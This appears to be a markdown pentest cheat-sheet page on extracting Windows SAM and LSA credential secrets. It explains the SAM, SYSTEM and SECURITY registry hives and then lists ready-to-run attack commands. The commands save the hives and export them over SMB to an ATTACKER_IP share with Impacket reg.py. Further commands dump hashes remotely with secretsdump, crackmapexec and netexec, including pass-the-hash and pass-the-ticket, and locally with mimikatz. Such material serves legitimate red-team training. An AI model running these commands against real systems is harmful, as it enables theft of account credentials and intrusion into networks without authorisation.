# SAM & LSA Secrets
## Theory
With access to a non-domain joined Windows system, we may benefit from attempting to quickly dump the files associated with the SAM database to transfer them to our attack host and start cracking hashes offline. Doing this offline will ensure we can continue to attempt our attacks without maintaining an active session with a target. Let's walk through this process together using a target host. Feel free to follow along by spawning the target box in this section.
Copying SAM Registry Hives

There are three registry hives that we can copy if we have local admin access on the target; each will have a specific purpose when we get to dumping and cracking the hashes. Here is a brief description of each in the table below:

| Registry Hive | Description |
|------------------|-----------------|
| hklm\sam         | Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext. stores locally cached credentials (referred to as SAM secrets)	|
| hklm\system      | Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database. contains enough info to decrypt SAM secrets and LSA secrets	|
| hklm\security    | Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target. stores domain cached credentials (referred to as LSA secrets)	|

## Practice
### Exfiltration
=== "Windows"
    ```powershell
    # Using reg.exe save to Copy Registry Hives
    > reg.exe save hklm\sam C:\sam.save
    > reg.exe save hklm\system C:\system.save
    > reg.exe save hklm\security C:\security.save
    ```

=== "UNIX-like"
    [Impacket](https://github.com/SecureAuthCorp/impacket)'s reg.py (Python) script can also be used to do the same operation remotely for a UNIX-like machine.

    !!! Tip
        The attacker can start an SMB server, and indicate an UNC path including his IP address so that the hives get exported directly to his server.

    ```bash
    # save each hive manually
    reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SAM' -o '\\ATTACKER_IPs\someshare'
    reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SYSTEM' -o '\\ATTACKER_IP\someshare'
    reg.py "domain"/"user":"password"@"target" save -keyName 'HKLM\SECURITY' -o '\\ATTACKER_IP\someshare'

    # backup all SAM, SYSTEM and SECURITY hives at once
    reg.py "domain"/"user":"password"@"target" backup -o '\\ATTACKER_IP\someshare'
    ```

### Secrets dump 
=== "secretsdump"
    [Impacket](https://github.com/SecureAuthCorp/impacket)'s secretsdump (Python) can be used to dump SAM and LSA secrets, either remotely, or from local files. For remote dumping, several authentication methods can be used like pass-the-hash (LM/NTLM), or pass-the-ticket (Kerberos).

    ```bash
    # Remote dumping of SAM & LSA secrets
    secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'

    # Remote dumping of SAM & LSA secrets (pass-the-hash)
    secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'

    # Remote dumping of SAM & LSA secrets (pass-the-ticket)
    secretsdump.py -k 'DOMAIN/USER@TARGET'
    
    # Offline dumping of SAM & LSA secrets from exported hives
    secretsdump.py -sam '/path/to/sam.save' -security '/path/to/security.save' -system '/path/to/system.save' LOCAL
    ```

=== "crackmapexec/netexec"
    [NetExec](https://github.com/Pennyw0rth/NetExec) (Python) can be used to remotely dump SAM and LSA secrets, on multiple hosts. It offers several authentication methods like pass-the-hash (NTLM), or pass-the-ticket (Kerberos)

    ```bash
    crackmapexec smb <IP/RANGE> --local-auth -u <USERNAME> -p <PASSWORD> --sam/--lsa
    crackmapexec smb <IP/RANGE> -u <USERNAME> -p <PASSWORD> --sam/--lsa

    # Remote dumping of SAM/LSA secrets
    netexec smb $TARGETS -d $DOMAIN -u $USER -p $PASSWORD --sam/--lsa

    # Remote dumping of SAM/LSA secrets (local user authentication)
    netexec smb $TARGETS --local-auth -u $USER -p $PASSWORD --sam/--lsa

    # Remote dumping of SAM/LSA secrets (pass-the-hash)
    netexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --sam/--lsa

    # Remote dumping of SAM/LSA secrets (pass-the-ticket)
    netexec smb $TARGETS --kerberos --sam/--lsa
    ```

=== "Mimikatz"
    ```bash
    mimikatz > privilege::debug
    mimikatz > token::elevate
    
    # Local dumping of SAM secrets on the target
    lsadump::sam

    # Offline dumping of SAM secrets from exported hives
    lsadump::sam /sam:'C:\path\to\sam.save' /system:'C:\path\to\system.save'
    
    # Local dumping of LSA secrets on the target
    lsadump::secrets
    
    # Offline dumping LSA secrets from exported hives
    lsadump::secrets /security:'C:\path\to\security.save' /system:'C:\path\to\system.save'
    ```

### Cracking Hashes with Hashcat
Check [Brute Force](../BruteForce/BruteForce.md#hashcat)

